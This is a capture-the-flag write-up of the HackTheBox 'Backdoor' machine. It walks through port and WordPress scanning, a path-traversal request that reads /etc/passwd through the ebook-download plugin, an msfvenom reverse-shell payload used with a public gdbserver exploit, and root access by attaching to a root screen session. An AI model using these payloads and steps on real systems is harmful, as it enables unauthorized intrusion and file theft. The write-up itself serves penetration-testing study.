### BackDoor HackTheBox

### Difficulty = Easy

### IP Address = 10.10.11.125

Nmap Scan:

```
└─$ nmap -sCV 10.10.11.125 -p22,80,1337 -oN nmapscan -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-24 18:41 WAT
Nmap scan report for 10.10.11.125
Host is up (0.31s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Backdoor &#8211; Real-Life
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.99 seconds
```

From the scan only 3 ports are open and nmap couldn't identify the service running on port 1337

#### Web Server Enumeration

Heading over to the web server on port 80 show this 
![image](https://user-images.githubusercontent.com/113513376/221250546-cfc25100-4339-4f57-91c1-a860075e26ae.png)

Its an instance of wordpress and we can confirm by checking wappalyzer or source code
![image](https://user-images.githubusercontent.com/113513376/221250778-0805b402-d9cd-4e84-ac78-801e2020b514.png)

I'll run wpscan on it to enumerate the wordpress cms

```└─$ wpscan --url http://10.10.11.125/ -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.11.125/ [10.10.11.125]
[+] Started: Fri Feb 24 18:45:10 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.11.125/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.11.125/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.10.11.125/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.11.125/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.8.1 identified (Insecure, released on 2021-09-09).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.11.125/index.php/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>
 |  - http://10.10.11.125/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.8.1</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://10.10.11.125/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://10.10.11.125/wp-content/themes/twentyseventeen/readme.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 2.8 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.11.125/wp-content/themes/twentyseventeen/style.css?ver=20201208, Match: 'Version: 2.8'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <==========================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.11.125/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Feb 24 18:45:24 2023
[+] Requests Done: 23
[+] Cached Requests: 36
[+] Data Sent: 6.197 KB
[+] Data Received: 78.631 KB
[+] Memory used: 167.711 MB
[+] Elapsed time: 00:00:14
```

It shows that the only user is `admin` and its version its `5.8.1` which doesn't have an form of vulnerability for an unauthenticated user

I don't want to start password brute force for user admin so firstly i'll run wpscan again but this time enumerate the plugins present

```
Command: wpscan --url http://10.10.11.125/ --plugins-detection aggressive -t100
```

But since `/wp-content/plugins/` has directory listing i'll get the list of plugins there

And it shows only ebook plugin 
![image](https://user-images.githubusercontent.com/113513376/221263510-b9d576a4-e3a0-469f-adb1-37c6a1a71d16.png)

Reading the `readme.txt` file shows it version which is ebook 1.1
![image](https://user-images.githubusercontent.com/113513376/221264671-6166d2bc-acd9-421e-8d1a-fe3226dd0af9.png)

Searching for exploit leads to a directory transversal vulnerability [Exploit](https://www.exploit-db.com/exploits/39575)

#### Exploit

Trying it to read local files works

```
└─$ curl -s 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd'           
../../../../../../etc/passwd../../../../../../etc/passwd../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
<script>window.close()</script> 
```

I tried reading files like sshkey but it doesn't work

Now if you remember there's a service running on port 1337

I will fuzz for process in /proc/FUZZ/cmdline

I made a quick script which is dirty but will do the work smh [Fuzz](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/htb/b2b/backdoor/fuzz.py)

After running the script eventually it runs finish 

On checking the process.txt file shows lot of thing and some are real process some are not

I edited it to form [this](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/htb/b2b/backdoor/process.txt)

Looking at it you will see 

```
/bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
```

With this we know that its gdbserver thats running on port 1337

I searched for exploit and got this [Exploit](https://www.exploit-db.com/exploits/50539)

Following what the exploit requires i'll generate a shellcode using msfvenom
![image](https://user-images.githubusercontent.com/113513376/221270425-ea5b86f6-b993-48d2-865f-9fc190f3b47b.png)


```
Command:  msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 PrependFork=true -o rev.bin
```

Now i'll run the exploit
![image](https://user-images.githubusercontent.com/113513376/221272717-01b8b3e8-85a8-44cd-91cb-c52095fce41b.png)

We have shell now 👽

Lets escalate priv 

But first we need to stabilize our shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
CTRL +Z
stty raw -echo;fg
export TERM=xterm
reset
```

Only one user on the box

```
user@Backdoor:/home/user$ ls -al
total 36
drwxr-xr-x 6 user user 4096 Nov 10  2021 .
drwxr-xr-x 3 root root 4096 Nov 10  2021 ..
lrwxrwxrwx 1 root root    9 Jul 18  2021 .bash_history -> /dev/null
-rw-r--r-- 1 user user 3771 Feb 25  2020 .bashrc
drwx------ 2 user user 4096 Nov 10  2021 .cache
drwx------ 3 user user 4096 Nov 10  2021 .config
drwx------ 4 user user 4096 Nov 10  2021 .gnupg
drwxrwxr-x 3 user user 4096 Nov 10  2021 .local
-rw-r--r-- 1 user user  807 Feb 25  2020 .profile
-rw-r----- 1 root user   33 Feb 24 19:20 user.txt
user@Backdoor:/home/user$ ls /home
user
user@Backdoor:/home/user$ 
```

If you remember there's a screen process running

```
/bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
```

I'll upload pspy to know who its running as

```
2023/02/24 20:15:26 CMD: UID=0    PID=1821   | sleep 1 
2023/02/24 20:15:27 CMD: UID=???  PID=1824   | ???
2023/02/24 20:15:27 CMD: UID=0    PID=1825   | sleep 1 
2023/02/24 20:15:28 CMD: UID=???  PID=1826   | ???
2023/02/24 20:15:28 CMD: UID=0    PID=1827   | sleep 1 
2023/02/24 20:15:29 CMD: UID=0    PID=1829   | sleep 1 
2023/02/24 20:15:30 CMD: UID=0    PID=1830   | 
2023/02/24 20:15:30 CMD: UID=0    PID=1831   | sleep 1 
2023/02/24 20:15:31 CMD: UID=0    PID=1832   | 
2023/02/24 20:15:31 CMD: UID=0    PID=1833   | sleep 1 
2023/02/24 20:15:32 CMD: UID=0    PID=1836   | 
2023/02/24 20:15:32 CMD: UID=0    PID=1837   | sleep 1 
2023/02/24 20:15:33 CMD: UID=0    PID=1838   | find /var/run/screen/S-root/ -empty -exec screen -dmS root ;                                         
```

Cool its running as root 

Running screen -ls will show sessions for the current user:

```
user@Backdoor:/home/user$ screen -ls
No Sockets found in /run/screen/S-user.
```

Since the process is running as root i'll check the sessions in root/ 

```
user@Backdoor:/home/user$ screen -ls root/
There is a suitable screen on:
        907.root        (02/24/23 20:11:07)     (Multi, detached)
1 Socket in /run/screen/S-root.
user@Backdoor:/home/user$ 
```

Now i'll attach to the root session

```
screen -x root/907
```

Doing that gives shell as root

```
root@Backdoor:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Backdoor:~# ls -al
total 44
drwx------  7 root root 4096 Nov 10  2021 .
drwxr-xr-x 19 root root 4096 Nov 15  2021 ..
lrwxrwxrwx  1 root root    9 Jul 18  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  2 root root 4096 Nov 10  2021 .cache
drwx------  3 root root 4096 Nov 10  2021 .config
drwxr-xr-x  3 root root 4096 Nov 10  2021 .local
lrwxrwxrwx  1 root root    9 Nov  6  2021 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwxr-xr-x  2 root root 4096 Nov 10  2021 .reset
-rw-r--r--  1 root root   33 Feb 24 20:11 root.txt
-rw-r--r--  1 root root   42 Feb 24 20:11 .screenrc
drwx------  2 root root 4096 Nov 10  2021 .ssh
root@Backdoor:~# cat root.txt 
a54e9fe799a68c3a8555940f22cd3fd7
root@Backdoor:~# 
```

And we're done
<br> <br>
[Back To Home](../../index.md)


